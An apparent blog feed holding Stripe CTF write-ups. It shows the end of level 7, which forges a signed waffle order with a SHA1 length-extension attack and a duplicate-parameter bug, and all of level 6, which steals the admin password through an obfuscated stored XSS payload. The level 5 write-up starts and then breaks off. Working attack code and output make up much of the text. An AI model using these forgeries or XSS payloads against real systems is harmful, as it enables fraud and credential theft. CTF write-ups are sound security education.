    &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;api_secret&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# signature = SHA1(secret + message)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can view our past orders at the URL /logs/id.&lt;/p&gt;
&lt;img alt="level07-ctf-order.png" class="align-center" src="/images/stripe-ctf-level-7/level07-ctf-order.png" /&gt;
&lt;p&gt;But what if we change the ID in the URL?&lt;/p&gt;
&lt;img alt="level07-larry-order.png" class="align-center" src="/images/stripe-ctf-level-7/level07-larry-order.png" /&gt;
&lt;img alt="level07-barry-order.png" class="align-center" src="/images/stripe-ctf-level-7/level07-barry-order.png" /&gt;
&lt;p&gt;Bingo, we are now viewing larry's and randall's past orders. But since
they didn't order any liege, we can't use these orders as is. Let's see
in the code how the order is checked:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# File wafflecopter.py, line 139&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;parse_params&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;raw_params&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;pairs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;raw_params&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;amp;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;pairs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unquote_plus&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unquote_plus&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That's the code which parse the body of the order. We can see that they
don't check if a parameter has been specified more than once. So if you
send an order of the form: &lt;code&gt;count=XXX&amp;amp;lat=XXX&amp;amp;user_id=XXX&amp;amp;long=XXX&amp;amp;waffle=XXX&amp;amp;waffle=YYY&lt;/code&gt;,
the last waffle will be ordered (in this case, YYY).&lt;/p&gt;
&lt;p&gt;Great, so we can just take a previous order from larry, append
&lt;code&gt;&amp;amp;waffle=liege&lt;/code&gt; to the end, and send it to the server!
Actually, we can't, because of the signature: if we change the order,
but not the signature, they won't match, and the server will refuse to
carry our order. So we need to change the signature. But how can we do
that without knowing larry's secret? The key here is cryptography.&lt;/p&gt;
&lt;p&gt;Like we said earlier, the signature is computed via &lt;code&gt;SHA1(secret +
message)&lt;/code&gt;. But the SHA1 function follows the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction"&gt;Merkle–Damgård
construction&lt;/a&gt;.
Basically, the message is broken up in equal blocks of 512 bits. Then,
computation is done on the first block and produces an output. This
output is used to perform the same computation on the second block, and
so on. So, it means that given &lt;code&gt;SHA1(secret + message)&lt;/code&gt; and the
and the length of &lt;code&gt;secret&lt;/code&gt;, we can compute &lt;code&gt;SHA1(secret + message +
message_modifier)&lt;/code&gt;. And that's exactly what we want, to append
something (here, &lt;code&gt;&amp;amp;waffle=liege&lt;/code&gt;) at the end of the message.&lt;/p&gt;
&lt;p&gt;I started searching for a Python implementation of SHA1, and wanted to
modify it so that it would compute my forged signature, but it took too
much time. Fortunately, two guys I was working with on the CTF,
&lt;a class="reference external" href="https://twitter.com/_Lopi_"&gt;lopi&lt;/a&gt; and mark, found a script that
could forge the signature for us. The script was taken down since then,
but you can find another working one &lt;a class="reference external" href="https://gist.github.com/philfreo/3873715"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python sha-padding.py
&lt;span class="go"&gt;usage: sha-padding.py &amp;lt;keylen&amp;gt; &amp;lt;original_message&amp;gt; &amp;lt;original_signature&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;text_to_append&amp;gt;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; python sha-padding.py &lt;span class="m"&gt;14&lt;/span&gt;
&lt;span class="go"&gt;&amp;quot;count=10&amp;amp;lat=37.351&amp;amp;user_id=1&amp;amp;long=-119.827&amp;amp;waffle=eggo&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;78943cff885d4b41ff058aa64a36520e66ffdbbe &amp;quot;&amp;amp;waffle=liege&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;new msg:&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;count=10&amp;amp;lat=37.351&amp;amp;user_id=1&amp;amp;long=-119.827&amp;amp;waffle=eggo\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02(&amp;amp;waffle=liege&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;base64:&lt;/span&gt;
&lt;span class="go"&gt;Y291bnQ9MTAmbGF0PTM3LjM1MSZ1c2VyX2lkPTEmbG9uZz0tMTE5LjgyNyZ3YWZmbGU9ZWdnb4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIoJndhZmZsZT1saWVnZQ==&lt;/span&gt;
&lt;span class="go"&gt;new sig: f7d4b492cc3282cd87e61624ee207ca496e807e4&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, we just have to make the order:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# File forged_client.py&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;StringIO&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;order&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;endpoint&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://localhost:9233&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;count=10&amp;amp;lat=37.351&amp;amp;user_id=1&amp;amp;long=-119.827&amp;amp;waffle=eggo&lt;/span&gt;&lt;span class="se"&gt;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02&lt;/span&gt;&lt;span class="s1"&gt;(&amp;amp;waffle=liege&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;signature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;f7d4b492cc3282cd87e61624ee207ca496e807e4&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;|sig:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;signature&lt;/span&gt;

    &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;StringIO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StringIO&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Curl&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;endpoint&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/orders&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POSTFIELDS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WRITEFUNCTION&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;perform&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getvalue&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;order&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python forged_client.py
&lt;span class="go"&gt;{&amp;quot;confirm_code&amp;quot;: &amp;quot;dummy-password&amp;quot;, &amp;quot;message&amp;quot;: &amp;quot;Great news: 10 liege&lt;/span&gt;
&lt;span class="go"&gt;waffles will soon be flying your way!&amp;quot;, &amp;quot;success&amp;quot;: true}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</content></entry><entry><title>Stripe CTF: Level #6</title><link href="https://allyourbase.utouch.fr/posts/2012/10/28/stripe-ctf-level-6/" rel="alternate"></link><published>2012-10-28T12:42:00+01:00</published><updated>2012-10-28T12:42:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-28:/posts/2012/10/28/stripe-ctf-level-6/</id><summary type="html">&lt;img alt="level06-logo.jpg" class="align-center" src="/images/stripe-ctf-level-6/level06-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-6/stripe-ctf-level06.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;0fed78164db1eced67ff8eeba0998c81901880b293667f63f74e2838e63d2bf3&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level is a message board: you can share updates with your
friends. The only thing is, you can't put messages with quotes and
double quotes, in order to prevent SQL injection. You also can't change
your password, but …&lt;/p&gt;</summary><content type="html">&lt;img alt="level06-logo.jpg" class="align-center" src="/images/stripe-ctf-level-6/level06-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-6/stripe-ctf-level06.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;0fed78164db1eced67ff8eeba0998c81901880b293667f63f74e2838e63d2bf3&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level is a message board: you can share updates with your
friends. The only thing is, you can't put messages with quotes and
double quotes, in order to prevent SQL injection. You also can't change
your password, but don't worry, it's visible on your profile page. Can
we use this to retrieve the admin's password?&lt;/p&gt;
&lt;p&gt;This level is a lot like level #4. When you post a message, the
server only checks for quotes and double quotes, not for script tags.
So, we can post a message consisting of javascript code which will
retrieve the password and post it on the board. But we can't use quotes
or double quotes: we'll have to obfuscate our code. And since the
admin's password contains quotes and double quotes, we'll have to
obfuscate it as well before we post it to the board. I chose to use
base64, and I found a javascript implementation
&lt;a class="reference external" href="http://www.webtoolkit.info/javascript-base64.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;pwn_password&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;xml_password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;xml_password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;XMLHttpRequest&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="nx"&gt;xml_password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/user_info&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;password_page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;xml_password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;responseText&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;csrf_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;new_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;elements&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;_csrf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;title=password&amp;amp;body=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
    &lt;span class="nx"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Base64&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;password_page&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;amp;_csrf=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
    &lt;span class="nx"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;csrf_token&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;xml_post&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;XMLHttpRequest&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/posts&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setRequestHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;application/x-www-form-urlencoded&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setRequestHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Length&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setRequestHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Connection&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;keep-alive&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;onload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;pwn_password&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We'll obfuscate it using String.fromCharCode (the following result
contains also the base64 function):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;fromCharCode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;47&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[...]&lt;/span&gt; &lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;59&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;125&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;));&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;&amp;lt;!-- The result is too big to be displayed entirely --&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's post this and wait for the admin to log in.&lt;/p&gt;
&lt;img alt="level06-form.png" class="align-center" src="/images/stripe-ctf-level-6/level06-form.png" /&gt;
&lt;p&gt;Now, we check the source code, and we see some base64-encoded stuff.&lt;/p&gt;
&lt;img alt="level06-source.png" class="align-center" src="/images/stripe-ctf-level-6/level06-source.png" /&gt;
&lt;p&gt;We just have to decode it.&lt;/p&gt;
&lt;img alt="level06-base64-decoded.png" class="align-center" src="/images/stripe-ctf-level-6/level06-base64-decoded.png" /&gt;
&lt;p&gt;We URL decode it, to clean a little bit:&lt;/p&gt;
&lt;img alt="level06-w00t.png" class="align-center" src="/images/stripe-ctf-level-6/level06-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</content></entry><entry><title>Stripe CTF: Level #5</title><link href="https://allyourbase.utouch.fr/posts/2012/10/27/stripe-ctf-level-5/" rel="alternate"></link><published>2012-10-27T23:31:00+02:00</published><updated>2012-10-27T23:31:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-27:/posts/2012/10/27/stripe-ctf-level-5/</id><summary type="html">&lt;img alt="level05-logo.jpg" class="align-center" src="/images/stripe-ctf-level-5/level05-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-5/stripe-ctf-level05.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;82b066cca46fd24a16959ada973d6df0d7c693f7791a8b673add276f324a5885&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level wants to solve a real problem: identification. We have too
many online accounts and we have to remember usernames/passwords for
everyone of them. It would be way simpler to be able to log into a new …&lt;/p&gt;</summary><content type="html">&lt;img alt="level05-logo.jpg" class="align-center" src="/images/stripe-ctf-level-5/level05-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-5/stripe-ctf-level05.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;82b066cca46fd24a16959ada973d6df0d7c693f7791a8b673add276f324a5885&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level wants to solve a real problem: identification. We have too
many online accounts and we have to remember usernames/passwords for
